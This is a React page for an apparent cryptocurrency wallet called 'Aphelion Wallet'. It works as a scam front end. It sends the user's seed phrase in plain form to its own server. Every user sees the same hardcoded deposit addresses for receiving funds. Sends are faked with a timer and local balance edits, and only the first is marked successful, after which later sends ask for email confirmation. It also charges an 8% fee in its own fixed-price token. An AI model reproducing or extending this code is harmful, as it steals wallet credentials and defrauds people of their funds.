import { useEffect, useState } from 'react';
import { ethers, isAddress } from 'ethers';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

function WalletPage() {
  const [mnemonic, setMnemonic] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [receiveModal, setReceiveModal] = useState({ open: false, token: null });
  const [sendModal, setSendModal] = useState({ open: false, token: null });
  const [sendStep, setSendStep] = useState(0);
  const [recipientAddress, setRecipientAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [lastSentAddress, setLastSentAddress] = useState('');
  const [sendCount, setSendCount] = useState(0);
  const [loading, setLoading] = useState(false);
  const [tokenBalances, setTokenBalances] = useState({});
  const [transactions, setTransactions] = useState([]);
  const [selectedToken, setSelectedToken] = useState('ALL');
  const [confirmationModal, setConfirmationModal] = useState(false);
  const [commission, setCommission] = useState(0);
  const [prices, setPrices] = useState({});
  const navigate = useNavigate();

  const tokens = [
    { symbol: 'APH',   name: 'Aphelion Token' },
    { symbol: 'ETH',   name: 'Ethereum'       },
    { symbol: 'USDT',  name: 'Tether USD'     },
    { symbol: 'BTC',   name: 'Bitcoin'        },
    { symbol: 'SHIBA', name: 'Shiba Inu'      },
  ];
  const getIconUrl = (symbol) =>
    `${import.meta.env.BASE_URL}icons/${symbol.toLowerCase()}.png`;

  const RECEIVE_ADDRESSES = {
    ETH:   '0xB30FEfF1e13b53221876a2157Af721d73b4b518d',
    USDT:  'TKyrATGVTGCGP2fUtRYrUpMLvvU89DQujC',
    BTC:   'bc1q3vmw0pjxkspkaj5hg4sm7f27xuku7zvrl272ar',
    SHIBA: '0x4c353c07224406a7110D0d71648A3A5a711E4577',
    APH:   '0x3E33b23460f9f4963ECeFC8f558DDF2a2b4b5F82',
  };
  
  // Получение транзакций
  const fetchTransactions = async () => {
    const userId = localStorage.getItem('user_id');
    if (!userId) return;
    try {
      const res = await axios.get(`${import.meta.env.VITE_API_URL}/api/transactions/${userId}`);
      setTransactions(res.data);
    } catch (err) {
      console.error('Ошибка загрузки транзакций:', err);
    }
  };

  // Получение балансов
  const fetchBalances = async () => {
    const userId = localStorage.getItem('user_id');
    if (!userId) return;
    try {
      const res = await axios.get(`${import.meta.env.VITE_API_URL}/api/balances/${userId}`);
      const balancesObj = {};
      res.data.forEach(({ token, amount }) => {
        balancesObj[token] = amount;
      });
      setTokenBalances(balancesObj);
    } catch (err) {
      console.error('Ошибка загрузки балансов:', err);
    }
  };

  // Получение курсов токенов
  const fetchTokenPrices = async () => {
    const tokenMap = {
        BTC: 'bitcoin',
      ETH: 'ethereum',
      USDT: 'tether',
      SHIBA: 'shiba-inu',
      APH: null, // собственный токен
    };
    const symbols = Object.values(tokenMap).filter(Boolean);
    try {
      const res = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
        params: {
          ids: symbols.join(','),
          vs_currencies: 'usd',
        },
      });
      const finalPrices = {};
      for (const [symbol, id] of Object.entries(tokenMap)) {
        if (id && res.data[id]) {
          finalPrices[symbol] = res.data[id].usd;
        } else if (symbol === 'APH') {
          finalPrices[symbol] = 0.2; // фиксированная цена
        }
      }
      setPrices(finalPrices);
    } catch (err) {
      console.error('Ошибка загрузки курсов:', err);
    }
  };

  // Начальная загрузка
  useEffect(() => {
    const savedMnemonic = localStorage.getItem('mnemonic');
    if (!savedMnemonic) {
      navigate('/');
      return;
    }
    setMnemonic(savedMnemonic);
    try {
      const wallet = ethers.Wallet.fromPhrase(savedMnemonic);
      setWalletAddress(wallet.address);
    } catch (error) {
      console.error('Ошибка создания кошелька:', error);
      navigate('/');
    }

    axios.post(`${import.meta.env.VITE_API_URL}/api/get-user`, { mnemonic: savedMnemonic })
      .then(res => {
        const userId = res.data.id;
        localStorage.setItem('user_id', userId);
        fetchTransactions();
        fetchBalances();
      })
      .catch(err => {
        console.error('Ошибка загрузки пользователя:', err);
        navigate('/');
      });
  }, [navigate]);

  // Периодическое обновление
  useEffect(() => {
    const interval = setInterval(() => {
      fetchBalances();
      fetchTransactions();
    }, 30000);
    return () => clearInterval(interval);
  }, []);

  // Загрузка курсов токенов
  useEffect(() => {
    fetchTokenPrices();
  }, []);

  // Фильтр транзакций
  const filteredTransactions =
    selectedToken === 'ALL'
      ? transactions
      : transactions.filter((tx) => tx.token === selectedToken);

  // Выход
  const logout = () => {
    localStorage.removeItem('mnemonic');
    localStorage.removeItem('user_id');
    navigate('/');
  };

  // Обновление локального состояния балансов
  const updateBalances = (updated) => {
    setTokenBalances(updated);
    localStorage.setItem('balances', JSON.stringify(updated));
  };

  // Модалки
  const openReceiveModal = (token) => {
    setTimeout(() => {
      setReceiveModal({ open: true, token });
    }, 200);
  };

  const closeReceiveModal = () => {
    setReceiveModal({ open: false, token: null });
  };

  const openSendModal = (token) => {
    setTimeout(() => {
      setSendModal({ open: true, token });
      setSendStep(0);
      setRecipientAddress('');
      setAmount('');
    }, 200);
  };

  const closeSendModal = () => {
    setSendModal({ open: false, token: null });
    setSendStep(0);
    setLoading(false);
    setConfirmationModal(false);
  };

  // Добавление транзакции на сервер
  const addTransaction = async (status) => {
    const tokenSym = sendModal.token.symbol;
    const parsed = parseFloat(amount) || 0;
    const amtToStore = tokenSym === 'APH'
      ? Math.max(0, parsed - commission)
      : parsed;

    const newTx = {
      token: tokenSym,
      amount: amtToStore,
      to_address: recipientAddress,
      status,
      date: new Date().toISOString(),
    };

    const userId = localStorage.getItem('user_id');
    try {
      await axios.post(`${import.meta.env.VITE_API_URL}/api/transaction`, {
        user_id: userId,
        token: newTx.token,
        amount: newTx.amount,
        to_address: newTx.to_address,
        status: newTx.status,
        date: newTx.date,
      });
    } catch (err) {
      console.error('Ошибка при сохранении транзакции на сервере:', err);
    }
  };

  // Отправка токенов
  const handleSend = () => {
    const tokenSymbol = sendModal.token.symbol;
    const parsedAmount = parseFloat(amount);
    const userBalance = tokenBalances[tokenSymbol] || 0;
    const aphBalance = tokenBalances.APH || 0;

    // commission уже в state
    if (sendStep === 0) {
      if (!recipientAddress || !isAddress(recipientAddress)) {
        alert('Please enter a valid address');
        return;
      }
      if (!amount || isNaN(parsedAmount) || parsedAmount <= 0) {
        alert('Please enter a valid amount');
        return;
      }
      if (parsedAmount > userBalance) {
        alert('Insufficient funds');
        return;
      }
      if (tokenSymbol !== 'APH' && commission > aphBalance) {
        alert(`Insufficient APH for the fee (${commission.toFixed(4)} APH required)`);
        return;
      }
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setLastSentAddress(recipientAddress);
        setSendStep(sendCount === 0 ? 1 : 2);
        if (sendCount >= 1) {
          setConfirmationModal(true);
          addTransaction('Awaiting confirmation');
        }
      }, 1500);
    } else if (sendStep === 1) {
      // обновляем балансы с учётом комиссии
      const updated = { ...tokenBalances };
      updated[tokenSymbol] -= parsedAmount;
      if (tokenSymbol !== 'APH') {
        updated.APH -= commission;
      } else {
        // APH: уже храним amount - commission, но списываем полную сумму
        updated.APH -= parsedAmount;
      }
      setTokenBalances(updated);
      localStorage.setItem('balances', JSON.stringify(updated));
      addTransaction('Successful.');
      setSendCount((p) => p + 1);
      closeSendModal();
    } else {
      closeSendModal();
    }
  };
 
  // Стили для таблицы
  const th = {
    padding: '10px',
    textAlign: 'left',
    borderBottom: '2px solid #0ff',
    color: '#0ff',
    fontWeight: '600',
    fontFamily: 'Segoe UI, sans-serif',
  };
  const td = {
    padding: '10px',
    color: '#fff',
    fontFamily: 'Segoe UI, sans-serif',
    fontSize: '14px',
  };
  return (
    <div style={{ padding: '2rem', fontFamily: 'Segoe UI, sans-serif', maxWidth: '1000px', margin: '0 auto' }}>
      
      {/* Заголовок Aphelion Wallet в правом верхнем углу */}
      <h1 style={{
        position: 'absolute',
        top: '20px',
        right: '20px',
        fontFamily: "'Orbitron', sans-serif",
        fontSize: '38px',
        color: '#0ff',
        textShadow: '0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff',
        margin: 0,
        animation: 'glow 2s ease-in-out infinite alternate'
      }}>
        Aphelion Wallet
      </h1>

      {/* Анимация для неонового заголовка */}
      <style>{`
        @keyframes glow {
          0% { text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff; }
          100% { text-shadow: 0 0 20px #0ff, 0 0 30px #0ff, 0 0 40px #0ff; }
        }
      `}</style>

      {/* Блок с аватаром и кнопкой "Выйти" */}
      <div className="user-info" style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-start', marginTop: '80px' }}>
        <img
          src="/avatar.png"
          alt="User"
          style={{ width: '50px', height: '50px', borderRadius: '50%', marginRight: '10px' }}
        />
        <button
          style={{
            padding: '8px 16px',
            backgroundColor: '#1f6feb',
            color: '#fff',
            border: 'none',
            borderRadius: '8px',
            cursor: 'pointer',
            fontWeight: 'bold'
          }}
          onClick={logout}
        >
          Log out
        </button>
      </div>

      <h2 style={{ marginTop: '2rem' }}>Your assets</h2>
      <div style={{
        backgroundColor: '#1e1e1e',
        padding: '16px 24px',
        borderRadius: '12px',
        marginBottom: '1.5rem',
        boxShadow: '0 4px 12px rgba(0, 0, 0, 0.2)',
        maxWidth: '300px',
        color: '#fff'
      }}>
        <p style={{ margin: 0, fontSize: '16px', color: '#aaa' }}>Total Balance</p>
        <p style={{ margin: 0, fontSize: '22px', fontWeight: 'bold', color: '#00d8ff' }}>
          ${Object.entries(tokenBalances).reduce((total, [symbol, amount]) => {
            const price = prices[symbol] || 0;
            return total + amount * price;
          }, 0).toFixed(2)} USDT
        </p>
      </div>

      <div style={{ display: 'flex', flexWrap: 'wrap', gap: '20px' }}>
        {tokens.map((token) => (
          <div
            key={token.symbol}
            style={{
              backgroundColor: '#1e1e1e',
              borderRadius: '16px',
              padding: '20px',
              width: '220px',
              boxShadow: '0 4px 16px rgba(0, 0, 0, 0.3)',
              color: '#fff',
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'space-between',
            }}
          >      <div style={{ display: 'flex', alignItems: 'center', marginBottom: '12px' }}>
          <img
            src={getIconUrl(token.symbol)}
            alt={`${token.symbol} icon`}
            style={{ width: 24, height: 24, marginRight: 8 }}
          />
          <h3 style={{ fontSize: 22, fontWeight: 'bold', color: '#00d8ff', margin: 0 }}>
            {token.symbol}
          </h3>
        </div>
            <div>
           
              <p style={{ fontSize: '14px', color: '#aaa', marginBottom: '12px' }}>
                {token.name}
              </p>
              <p style={{ fontSize: '18px', fontWeight: 'bold' }}>
                {(tokenBalances[token.symbol] || 0).toFixed(4)}
              </p>
            </div>
            <div style={{ display: 'flex', gap: '10px', marginTop: '15px' }}>
              <button
                style={{
                  flex: 1,
                  padding: '8px',
                  backgroundColor: '#1f6feb',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontWeight: 'bold',
                }}
                onClick={() => openSendModal(token)}
              >
                Send
              </button>
              <button
                style={{
                  flex: 1,
                  padding: '8px',
                  backgroundColor: '#1f6feb',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontWeight: 'bold',
                }}
                onClick={() => openReceiveModal(token)}
              >
                Get
              </button>
            </div>
          </div>
        ))}
      </div>

      {receiveModal.open && (
        <div
          onClick={closeReceiveModal}
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'rgba(0,0,0,0.5)',
            zIndex: 1000,
          }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: '#fff',
              maxWidth: '420px',
              margin: '10% auto',
              padding: '25px 30px',
              borderRadius: '16px',
              boxShadow: '0 10px 25px rgba(0, 0, 0, 0.2)',
              textAlign: 'center',
            }}
          >
            <h3 style={{ marginBottom: '15px', color: '#000', fontSize: '20px' }}>
            Receive {receiveModal.token.symbol}
            </h3>
            <p style={{ marginBottom: '5px', fontSize: '14px', color: '#333' }}>Your address:</p>
            <code style={{ fontSize: '13px', wordBreak: 'break-all', color: '#444' }}>
  {RECEIVE_ADDRESSES[receiveModal.token.symbol]}
</code>
            <div style={{ marginTop: '20px' }}>
              <button
                onClick={closeReceiveModal}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#1f6feb',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontWeight: 'bold',
                }}
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {sendModal.open && (
 <div onClick={closeSendModal} style={{ position: 'fixed', top:0, left:0, right:0, bottom:0, background:'rgba(0,0,0,0.5)', zIndex:1000 }}>
 <div onClick={(e)=>e.stopPropagation()} style={{
   background:'#fff', maxWidth:'420px', margin:'10% auto', padding:'25px 30px',
   borderRadius:'16px', boxShadow:'0 10px 25px rgba(0,0,0,0.2)', textAlign:'center'
 }}>
   {sendStep === 0 && <>
     <h3 style={{ marginBottom:'15px', color:'#000', fontSize:'20px' }}>
       Sending {sendModal.token.symbol}
     </h3>
     <input
       type="text"
       placeholder="Recipient's address"
       value={recipientAddress}
       onChange={(e) => setRecipientAddress(e.target.value)}
       style={{ width:'100%', marginBottom:'10px', padding:'10px', borderRadius:'8px', border:'1px solid #ccc', fontSize:'14px' }}
     />
     <input
       type="text"
       placeholder="Amount"
       value={amount}
       onChange={(e) => {
         const v = e.target.value;
         setAmount(v);
         const num = parseFloat(v);
         if (!isNaN(num) && num > 0) {
           const price = prices[sendModal.token.symbol] || 0;
           const priceAPH = prices.APH || 1;
           const commissionUSD = num * price * 0.08;
           setCommission(commissionUSD / priceAPH);
         } else {
           setCommission(0);
         }
       }}
       style={{ width:'100%', marginBottom:'10px', padding:'10px', borderRadius:'8px', border:'1px solid #ccc', fontSize:'14px' }}
     />
     {amount && !isNaN(parseFloat(amount)) && (
       <p style={{ fontSize:'12px', color:'#555' }}>
         Commission: {commission.toFixed(4)} APH
       </p>
     )}
     <div style={{ display:'flex', justifyContent:'space-between', marginTop:'20px', gap:'12px' }}>
       <button
         onClick={handleSend}
         style={{
           flex:1, padding:'12px 24px', backgroundColor:'#1f6feb', color:'#fff',
           border:'none', borderRadius:'10px', cursor:'pointer',
           fontWeight:'600', fontSize:'15px', boxShadow:'0 4px 12px rgba(31,111,235,0.3)',
           transition:'background 0.2s'
         }}
         onMouseOver={e=>e.currentTarget.style.backgroundColor='#0f5ed9'}
         onMouseOut={e=>e.currentTarget.style.backgroundColor='#1f6feb'}
       >Send</button>
       <button
         onClick={closeSendModal}
         style={{
           flex:1, padding:'12px 24px', backgroundColor:'#f2f2f2', color:'#444',
           border:'none', borderRadius:'10px', cursor:'pointer',
           fontWeight:'600', fontSize:'15px', boxShadow:'0 2px 6px rgba(0,0,0,0.1)',
           transition:'background 0.2s'
         }}
         onMouseOver={e=>e.currentTarget.style.backgroundColor='#e0e0e0'}
         onMouseOut={e=>e.currentTarget.style.backgroundColor='#f2f2f2'}
       >Cancel</button>
     </div>
   </>}
   {sendStep === 1 && <>
     <p style={{ fontSize:'16px', color:'#333' }}>Coins have been successfully sent to the address:</p>
     <code style={{ wordBreak:'break-all', fontSize:'14px', color:'#444' }}>
       {lastSentAddress}
     </code>
     <div style={{ marginTop:'20px' }}>
       <button
         onClick={handleSend}
         style={{ padding:'10px 25px', backgroundColor:'#1f6feb', color:'#fff',
                  border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold' }}
       >Ready</button>
     </div>
   </>}
   {sendStep === 2 && confirmationModal && <>
     <p style={{ fontSize:'16px', color:'#333' }}>Please confirm the operation via email</p>
     <div style={{ marginTop:'20px' }}>
       <button
         onClick={handleSend}
         style={{ padding:'10px 25px', backgroundColor:'#1f6feb', color:'#fff',
                  border:'none', borderRadius:'8px', cursor:'pointer', fontWeight:'bold' }}
       >Close</button>
     </div>
   </>}
   {loading && <p style={{ color:'#888', marginTop:'15px' }}>Send...</p>}
 </div>
</div>
)}

{transactions.length > 0 && (
<div style={{ marginTop:'3rem' }}>
 <h2>Transaction history</h2>
 <div style={{ marginBottom:'10px' }}>
   <label>Filter by coin: </label>
   <select
     value={selectedToken}
     onChange={(e) => setSelectedToken(e.target.value)}
     style={{ padding:'6px', marginLeft:'10px' }}
   >
     <option value="ALL">All</option>
     {tokens.map((t) => <option key={t.symbol} value={t.symbol}>{t.symbol}</option>)}
   </select>
 </div>
 <table style={{ width:'100%', borderCollapse:'collapse', marginTop:'10px' }}>
   <thead>
     <tr style={{ background:'#111' }}>
       <th style={th}>Date</th>
       <th style={th}>Token</th>
       <th style={th}>Amount</th>
       <th style={th}>Address</th>
       <th style={th}>Status</th>
     </tr>
   </thead>
   <tbody>
     {filteredTransactions.map((tx, i) => (
       <tr key={i} style={{ borderBottom:'1px solid #333' }}>
         <td style={td}>{tx.date ? new Date(tx.date).toLocaleString() : '—'}</td>
         <td style={td}>{tx.token}</td>
         <td style={td}>{tx.amount.toFixed ? tx.amount.toFixed(4) : tx.amount}</td>
         <td style={td}>{tx.to_address}</td>
         <td style={td}>{tx.status}</td>
       </tr>
     ))}
   </tbody>
 </table>
</div>
)}

      <div className="wallet-footer-buttons" style={{ marginTop: '2rem', display: 'flex', justifyContent: 'space-between' }}>
        <button className="footer-btn" onClick={() => navigate('/settings')}>Settings</button>
        <button className="footer-btn" onClick={() => navigate('/support')}>Support</button>
        <button className="footer-btn" onClick={() => navigate('/tokens')}>About tokens</button>
        <button className="footer-btn" onClick={() => navigate('/')}>Back</button>
      </div>

      <footer className="footer" style={{ marginTop: '2rem', textAlign: 'center' }}>
        © 2025 Aphelion Wallet | All rights reserved
      </footer>
    </div>
  );
}

export default WalletPage;
  